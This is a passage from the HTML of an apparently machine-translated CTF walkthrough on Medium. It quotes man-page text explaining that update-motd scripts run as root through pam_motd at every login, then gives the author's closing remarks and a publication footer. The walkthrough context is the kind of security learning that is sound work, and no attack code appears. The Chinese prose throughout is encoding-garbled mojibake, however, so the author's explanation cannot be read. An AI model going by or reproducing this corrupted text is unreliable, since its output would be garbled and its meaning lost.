ir">pam_motd</strong></a>(8) as the root user at each  login,  and  this  information  is  concatenated in /run/motd.dynamic.  The order of script  execution  is  determined  by  the  <a class="ae kx" href="http://manpages.ubuntu.com/manpages/disco/en/man8/run-parts.8.html" rel="noopener ugc nofollow" target="_blank"><strong class="mc ir">run-parts</strong></a>(8)  --lsbsysinit  option  (basically alphabetical order, with a few caveats).</span></pre><p id="8242" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å…¶ä¸­pam_motdä¸º:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="a496" class="mg kz iq mc b gy mh mi l mj mk">pam_motd is a PAM module that can be used to display arbitrary motd (message of the day)files after a successful login.</span></pre><p id="7856" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆæˆ‘æ¯æ¬¡è¿›å…¥ç›’å­éƒ½ä¼šè§¦å‘è¿™äº›ã€‚</p><p id="0f79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™å°±æ˜¯æˆ‘å¦‚ä½•ä»é»‘ç›’å­å¼€å§‹å†™ç›’å­çš„ã€‚æˆ‘å¸Œæœ›ä½ èƒ½ä»è¿™æ¬¡æ¼”ç»ƒä¸­å­¦åˆ°ä¸€äº›ä¸œè¥¿ã€‚å¹²æ¯ï¼ğŸº</p></div><div class="ab cl oa ob hu oc" role="separator"><span class="od bw bk oe of og"/><span class="od bw bk oe of og"/><span class="od bw bk oe of"/></div><div class="ij ik il im in"><p id="aefb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nr">å…³æ³¨</em> <a class="ae kx" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nr"> InfosecæŠ¥é“</em> </a> <em class="nr">è·å–æ›´å¤šæ­¤ç±»ç²¾å½©æŠ¥é“ã€‚</em></p><div class="oh oi gp gr oj ok"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="ol ab fo"><div class="om ab on cl cj oo"><h2 class="bd ir gy z fp op fr fs oq fu fw ip bi translated">ä¿¡æ¯å®‰å…¨æŠ¥é“</h2><div class="or l"><h3 class="bd b gy z fp op fr fs oq fu fw dk translated">æ”¶é›†äº†ä¸–ç•Œä¸Šæœ€å¥½çš„é»‘å®¢çš„æ–‡ç« ï¼Œä¸»é¢˜ä»bugå¥–é‡‘å’ŒCTFåˆ°vulnhubâ€¦</h3></div><div class="os l"><p class="bd b dl z fp op fr fs oq fu fw dk translated">medium.com</p></div></div><div class="ot l"><div class="ou l ov ow ox ot oy kr ok"/></div></div></a></div></div></div>    
</body>
</html>